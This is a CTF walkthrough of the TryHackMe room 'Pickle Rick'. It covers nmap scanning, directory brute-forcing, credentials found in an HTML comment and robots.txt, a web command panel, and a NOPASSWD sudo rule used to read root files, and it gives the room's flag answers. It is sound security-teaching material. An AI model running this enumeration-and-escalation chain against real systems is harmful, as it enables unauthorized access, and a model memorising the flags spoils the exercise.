# Pickle Rick — Full Exploitation Walkthrough

## Room Overview

**Pickle Rick** is an easy web-exploitation CTF on TryHackMe. Rick has turned himself into a pickle and needs three secret ingredients for his pickle-reverse potion. The chain is:

1. Nmap for service discovery
2. Directory brute-forcing with bustit
3. Credentials recovered from an HTML comment and `robots.txt`
4. Login to the portal (`login.php`) to reach a command panel (`portal.php`)
5. First ingredient from `/home/rick/Sup3rs3cretPickl3Ingred.txt`
6. Second ingredient from `/home/rick/second ingredients`
7. Third ingredient from `/root/3rd.txt` — all reads done with an unrestricted `sudo` rule

The room was completed from the local Arch machine for everything except the browser-based portal login.

## Step 1: Service Enumeration

Nmap reveals two listening services:

```
sudo nmap -T4 -sV --open 10.48.131.21

22/tcp open ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open http  Apache httpd 2.4.41 ((Ubuntu))
```

| Port | Service | Version             |
| ---- | ------- | ------------------- |
| 22   | SSH     | OpenSSH 8.2p1       |
| 80   | HTTP    | Apache httpd 2.4.41 |

> **Trap:** SSH only accepts public-key authentication — password attempts fail with `Permission denied (publickey)`. So port 22 is a dead end; the web app is the real attack surface.

## Step 2: Web Directory Enumeration

Running the user's **bustit** directory brute-forcer against the site:

```
bustit http://10.48.131.21/ /home/l/wordlist/subdirs/web-paths.txt -t 100 -v
```

Interesting results:

| Status | Path         | Note                                    |
| ------ | ------------ | --------------------------------------- |
| 200    | `index.html` | Homepage — hidden username              |
| 200    | `robots.txt` | Password                                |
| 200    | `login.php`  | Portal login page                       |
| 302    | `portal.php` | Redirects to login when unauthenticated |
| 301    | `assets/`    | Static assets                           |

## Step 3: Recovering the Credentials

### Username — an HTML comment

The homepage source contains a "note to self" left as an HTML comment:

```
curl -s http://10.48.131.21/index.html
```

```html
<!--
    Note to self, remember username!
    Username: R1ckRul3s
-->
```

### Password — robots.txt

```
curl -s http://10.48.131.21/robots.txt
Wubbalubbadubdub
```

**Credentials:** `R1ckRul3s` / `Wubbalubbadubdub`

## Step 4: Login Portal & Command Panel

`login.php` presents a username/password form that POSTs the credentials back to itself. Submitting `R1ckRul3s` / `Wubbalubbadubdub` authenticates the session and grants access to the **Command Panel** at `portal.php`.

The panel is a web-based shell — it echoes the output of whatever command you type. This is our foothold.

## Step 5: `sudo -l` — Immediate Root

Running `sudo -l` in the command panel shows the web user has root-equivalent power:

```
Matching Defaults entries for www-data on ...:
    env_reset, mail_badpass, secure_path=...

User www-data may run the following commands on ...:
    (ALL) NOPASSWD: ALL
```

`www-data` can run **any** command as root **without a password**. Every file read from here on is prefixed with `sudo`.

## Step 6: First Ingredient

Enumerate the users to find where secrets live:

```
ls /home
rick
```

```
sudo ls /home/rick
Sup3rs3cretPickl3Ingred.txt  second ingredients
```

Read the obvious flag file:

```
sudo less /home/rick/Sup3rs3cretPickl3Ingred.txt
mr. meeseek hair
```

**First ingredient:** `mr. meeseek hair`

## Step 7: Second Ingredient

`/home/rick` also contains a file literally named `second ingredients` (note the space — it must be quoted):

```
sudo less "/home/rick/second ingredients"
1 jerry tear
```

**Second ingredient:** `1 jerry tear`

## Step 8: Third Ingredient (Root)

Still under `www-data`, but with `(ALL) NOPASSWD: ALL`, reading the root flag is a single command:

```
sudo less /root/3rd.txt
3rd ingredients: fleeb juice
```

**Third ingredient:** `fleeb juice`

## Evidence

![Nmap scan](screenshots/nmap-scan.png)
![Directory brute-force](screenshots/directory-brute-force.png)
![Credentials from source and robots.txt](screenshots/credentials-from-source-and-robots.png)
![Command panel and sudo -l](screenshots/command-panel-and-sudo-l.png)
![Root directory listing](screenshots/root-directory-listing.png)
![Second ingredient](screenshots/second-ingredient-jerry-tear.png)
![Third ingredient](screenshots/third-ingredient-fleeb-juice.png)

## Conclusion

Pickle Rick is a tidy five-stage web chain:

1. **Nmap** → only HTTP (and a publickey-only SSH dead end)
2. **bustit directory brute-force** → `login.php`, `portal.php`, `robots.txt`
3. **HTML comment + `robots.txt`** → `R1ckRul3s` / `Wubbalubbadubdub`
4. **Portal login → command panel** → a web shell as `www-data`
5. **`sudo -l` → `(ALL) NOPASSWD: ALL`** → read the three ingredient files directly as root

The takeaway: enumerate the source, check `robots.txt`, and inspect `sudo -l` the moment you land a shell — a careless NOPASSWD rule turns a low-priv web user into root instantly.
